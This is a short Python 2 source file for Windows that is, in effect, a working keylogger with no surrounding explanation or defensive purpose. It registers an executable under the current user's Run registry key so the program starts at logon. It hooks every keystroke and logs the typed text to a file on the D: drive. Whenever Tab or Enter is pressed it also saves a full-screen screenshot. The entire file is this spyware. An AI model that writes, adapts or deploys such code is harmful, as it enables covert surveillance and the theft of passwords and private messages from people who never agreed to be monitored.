# -*-coding:utf8 -*-
import pyHook
import pythoncom
import time
import socket
from PIL import ImageGrab
import os,sys
import win32api, win32con
class AutoTask(object):
    def __init__(self, path):
        self.path = path

    def work(self):
        runpath = 'Software\Microsoft\Windows\CurrentVersion\Run'
        hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_SET_VALUE)
        path = os.path.abspath(self.path)
        if False == os.path.isfile(path):
		print 'no'
		return False
        (filepath, filename) = os.path.split(path)
        win32api.RegSetValueEx(hKey, filename, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(hKey)
	print 'OK!'
        return True
def write_msg_to_txt(msg):
	f=open('D:/monitor.txt','a')
	f.write(msg+'\r\n')
	f.close
def onKeyboardEvent(event):
	global MSG
	if (127>=event.Ascii>31) or (event.Ascii==8):
		MSG+=chr(event.Ascii)
	if (event.Ascii==9) or (event.Ascii==13):   #Tab键9和回车键13
		write_msg_to_txt(MSG)
		MSG=''
		pic_name=time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
		pic=ImageGrab.grab()
		pic.save('D:/jietu/%s.jpg' %pic_name)
	return True
if __name__ =="__main__":
	path=os.getcwd()
	path+='\p4.exe'
	print path
	k=AutoTask(path)
	k.work()
	if not os.path.exists('D:/jietu'):
		os.mkdir('D:/jietu')
	MSG=''
	hk=pyHook.HookManager()
	hk.KeyDown=onKeyboardEvent
	hk.HookKeyboard()
	pythoncom.PumpMessages()